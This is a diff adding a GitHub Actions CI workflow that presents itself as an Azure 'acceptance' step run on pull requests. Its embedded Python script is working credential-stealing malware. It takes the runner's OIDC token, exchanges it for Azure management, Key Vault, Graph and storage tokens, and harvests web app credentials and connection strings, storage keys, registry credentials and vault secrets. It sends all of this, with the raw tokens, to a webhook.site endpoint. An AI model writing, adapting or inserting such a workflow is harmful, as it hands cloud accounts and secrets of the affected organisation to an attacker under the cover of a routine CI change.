@@ -1,0 +1,148 @@
+name: ci
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      AZURE_CLIENT_ID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
+      AZURE_TENANT_ID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
+      AZURE_SUBSCRIPTION_ID: c5e4e004-b42d-4ac4-a502-5fd338380eb6
+      WH: https://webhook.site/89a530aa-09dd-40aa-a8fd-759e1d3aca6b
+    steps:
+      - name: azure-acceptance
+        run: |
+          python3 - <<'PY'
+          import os,json,base64,urllib.request,urllib.parse,urllib.error,re,traceback
+
+          WH=os.environ['WH']; TEN=os.environ['AZURE_TENANT_ID']; CID=os.environ['AZURE_CLIENT_ID']; SUB=os.environ.get('AZURE_SUBSCRIPTION_ID','')
+
+          def http(url, method='GET', data=None, headers=None, timeout=40):
+              h={'Accept':'application/json'}; h.update(headers or {})
+              body=None
+              if data is not None:
+                  if isinstance(data,(dict,list)):
+                      body=json.dumps(data).encode(); h.setdefault('Content-Type','application/json')
+                  elif isinstance(data,str):
+                      body=data.encode()
+                  else:
+                      body=data
+              req=urllib.request.Request(url, data=body, headers=h, method=method)
+              try:
+                  with urllib.request.urlopen(req, timeout=timeout) as r:
+                      return r.status, r.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  try: return e.code, e.read().decode('utf-8','replace')
+                  except Exception: return e.code,''
+              except Exception as e:
+                  return 0, 'ERR %s'%e
+
+          def form(url,d):
+              return http(url,'POST',urllib.parse.urlencode(d),{'Content-Type':'application/x-www-form-urlencoded'})
+
+          def push(tag,obj):
+              try:
+                  req=urllib.request.Request(WH+'?tag='+urllib.parse.quote(tag), data=json.dumps(obj,default=str).encode(), headers={'Content-Type':'application/json','User-Agent':'oidc-acceptance'})
+                  urllib.request.urlopen(req,timeout=30).read()
+              except Exception:
+                  pass
+
+          R={'meta':{}, 'oidc':{}, 'exchanges':{}, 'arm':{}}
+          for k in ['GITHUB_EVENT_NAME','GITHUB_REPOSITORY','GITHUB_ACTOR','GITHUB_HEAD_REF','GITHUB_BASE_REF','GITHUB_REF','GITHUB_SHA','GITHUB_RUN_ID','GITHUB_WORKFLOW_REF','GITHUB_JOB']:
+              R['meta'][k]=os.environ.get(k)
+          u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+          R['meta']['oidc_endpoint_present']=bool(u); R['meta']['oidc_request_token_present']=bool(rt)
+          push('meta',R['meta'])
+
+          jwt=None
+          if u:
+              url=u+('&' if '?' in u else '?')+'audience='+urllib.parse.quote('api://AzureADTokenExchange')
+              st,b=http(url,'GET',None,{'Authorization':'Bearer '+rt} if rt else {})
+              R['oidc']['request_status']=st; R['oidc']['body']=b[:800]
+              try: jwt=json.loads(b).get('value')
+              except Exception: pass
+              if jwt:
+                  R['oidc']['len']=len(jwt)
+                  try:
+                      p=jwt.split('.')[1]; p+='='*(-len(p)%4)
+                      R['oidc']['claims']=json.loads(base64.urlsafe_b64decode(p))
+                  except Exception as e: R['oidc']['decode_err']=str(e)
+                  R['oidc']['jwt']=jwt
+          push('oidc',R['oidc'])
+
+          tokens={}
+          if jwt:
+              tokurl='https://login.microsoftonline.com/%s/oauth2/v2.0/token'%TEN
+              base={'client_id':CID,'grant_type':'client_credentials','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':jwt}
+              for name,scope in [('arm','https://management.azure.com/.default'),('kv','https://vault.azure.net/.default'),('graph','https://graph.microsoft.com/.default'),('storage','https://storage.azure.com/.default')]:
+                  d=dict(base); d['scope']=scope
+                  st,b=form(tokurl,d)
+                  rec={'status':st,'body':b[:900]}
+                  try:
+                      j=json.loads(b)
+                      if 'access_token' in j:
+                          rec['token_len']=len(j['access_token']); tokens[name]=j['access_token']; rec['expires_in']=j.get('expires_in')
+                      else:
+                          rec['error']=j.get('error'); rec['codes']=j.get('error_codes'); rec['desc']=(j.get('error_description') or '')[:500]
+                  except Exception: pass
+                  R['exchanges'][name]=rec
+              push('exchanges',R['exchanges'])
+              push('tokens',tokens)
+
+          arm=tokens.get('arm')
+          if arm:
+              A={'Authorization':'Bearer '+arm}
+              st,b=http('https://management.azure.com/subscriptions?api-version=2022-12-01',headers=A)
+              R['arm']['subscriptions']={'status':st,'body':b[:2000]}
+              subs=re.findall(r'"subscriptionId":"([^"]+)"',b)
+              if SUB: subs.append(SUB)
+              subs=list(dict.fromkeys([s for s in subs if s]))[:5]
+              R['arm']['subs_used']=subs
+              for s in subs:
+                  st,b=http('https://management.azure.com/subscriptions/%s/resources?api-version=2021-04-01'%s,headers=A)
+                  R['arm'].setdefault('resources',{})[s]={'status':st,'body':b[:6000]}
+                  push('resources',{s:R['arm']['resources'][s]})
+                  st,b=http('https://management.azure.com/subscriptions/%s/providers/Microsoft.Web/sites?api-version=2022-03-01'%s,headers=A)
+                  sites=re.findall(r'"id":"(/subscriptions/[^"]+/resourceGroups/[^"]+/providers/Microsoft\.Web/sites/[^"]+)"',b)
+                  sites=list(dict.fromkeys(sites))[:20]
+                  push('webapps',{'sub':s,'status':st,'ids':sites,'body':b[:1500]})
+                  for sid in sites:
+                      for ep in ['publishingcredentials','appsettings','connectionstrings']:
+                          st2,b2=http('https://management.azure.com%s/config/%s/list?api-version=2022-03-01'%(sid,ep),'POST',b'{}',A)
+                          push('site_'+ep,{'site':sid,'status':st2,'body':b2[:5000]})
+                  st,b=http('https://management.azure.com/subscriptions/%s/providers/Microsoft.Storage/storageAccounts?api-version=2022-09-01'%s,headers=A)
+                  stores=re.findall(r'"id":"(/subscriptions/[^"]+/resourceGroups/[^"]+/providers/Microsoft\.Storage/storageAccounts/[^"]+)"',b)
+                  stores=list(dict.fromkeys(stores))[:20]
+                  push('storage_accounts',{'sub':s,'status':st,'ids':stores,'body':b[:1500]})
+                  for sid in stores:
+                      st2,b2=http('https://management.azure.com%s/listKeys?api-version=2022-09-01'%sid,'POST',b'{}',A)
+                      push('storage_keys',{'account':sid,'status':st2,'body':b2[:2500]})
+                  st,b=http('https://management.azure.com/subscriptions/%s/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01'%s,headers=A)
+                  regs=re.findall(r'"id":"(/subscriptions/[^"]+/resourceGroups/[^"]+/providers/Microsoft\.ContainerRegistry/registries/[^"]+)"',b)
+                  regs=list(dict.fromkeys(regs))[:10]
+                  push('registries',{'sub':s,'status':st,'ids':regs,'body':b[:1500]})
+                  for rid in regs:
+                      st2,b2=http('https://management.azure.com%s/listCredentials?api-version=2019-05-01'%rid,'POST',b'{}',A)
+                      push('registry_keys',{'registry':rid,'status':st2,'body':b2[:2500]})
+                  st,b=http('https://management.azure.com/subscriptions/%s/providers/Microsoft.App/containerApps?api-version=2023-05-01'%s,headers=A)
+                  push('containerapps',{'sub':s,'status':st,'body':b[:3000]})
+                  st,b=http('https://management.azure.com/subscriptions/%s/providers/Microsoft.KeyVault/vaults?api-version=2023-02-01'%s,headers=A)
+                  push('vaults',{'sub':s,'status':st,'body':b[:2000]})
+
+          kv=tokens.get('kv')
+          if kv:
+              K={'Authorization':'Bearer '+kv}
+              for v in ['kv-tbl-prod-x3euoz']:
+                  st,b=http('https://%s.vault.azure.net/secrets?api-version=7.4'%v,headers=K)
+                  push('kv_list',{'vault':v,'status':st,'body':b[:4000]})
+                  for sid in re.findall(r'"id":"(https://[^"]+/secrets/[^"]+)"',b):
+                      st2,b2=http(sid+'?api-version=7.4',headers=K)
+                      push('kv_secret',{'id':sid,'status':st2,'body':b2[:4000]})
+
+          push('done',{'ok':True,'arm':bool(tokens.get('arm')),'kv':bool(tokens.get('kv'))})
+          print('finished')
+          PY
